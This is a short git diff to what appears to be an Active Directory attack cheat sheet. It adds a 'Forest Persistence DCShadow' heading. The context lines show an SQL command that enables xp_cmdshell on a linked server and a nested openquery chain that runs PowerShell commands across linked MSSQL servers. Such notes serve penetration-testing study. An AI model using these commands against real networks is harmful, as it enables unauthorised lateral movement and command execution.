@@ -35,6 +35,7 @@ Last update: **25 Nov 2021**
   -  [Child to Parent using Krbtgt Hash](#Child-to-Parent-using-krbtgt-hash)
   -  [Across Forest using Trust Tickets](#Across-forest-using-trust-tickets)
 - [Trust Abuse MSSQL Servers](#trust-abuse-mssql-servers)
+- [Forest Persistence DCShadow](#Forest-Persistence-DCShadow)
 
 ## Pre-requisites
 ### Using PowerView:
@@ -684,3 +685,5 @@ EXECUTE('sp_configure "xp_cmdshell",1;reconfigure;') AT "eu-sql"
 # Command: whoami
 select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt","select * from openquery("eu-sql.eu.corporate.local",""select@@version as version;exec master..xp_cmdshell "powershell whoami)"")")')
 ```
+
+# Forest Persistence DCShadow
